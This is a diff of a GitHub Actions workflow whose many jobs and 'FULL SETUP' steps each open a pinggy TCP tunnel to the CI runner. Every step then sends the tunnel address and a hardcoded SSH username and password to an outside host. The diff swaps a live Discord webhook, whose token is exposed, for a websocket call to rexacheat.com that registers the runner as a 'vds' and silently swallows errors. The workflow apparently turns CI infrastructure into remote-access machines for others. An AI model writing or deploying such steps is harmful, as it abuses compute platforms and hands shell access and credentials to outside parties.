-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -736,7 +1015,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -758,7 +1046,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -780,7 +1077,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -802,7 +1108,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-6:
@@ -830,7 +1145,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -852,7 +1176,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -874,7 +1207,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -896,7 +1238,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -918,7 +1269,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -940,7 +1300,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -962,7 +1331,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-7:
@@ -990,7 +1368,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1012,7 +1399,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1034,7 +1430,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1056,7 +1461,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1078,7 +1492,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1100,7 +1523,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1122,7 +1554,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-8:
@@ -1150,7 +1591,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1172,7 +1622,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1194,7 +1653,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1216,7 +1684,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1238,7 +1715,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1260,7 +1746,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1282,7 +1777,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-9:
@@ -1310,7 +1814,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1332,7 +1845,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1354,7 +1876,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1376,7 +1907,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1398,7 +1938,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
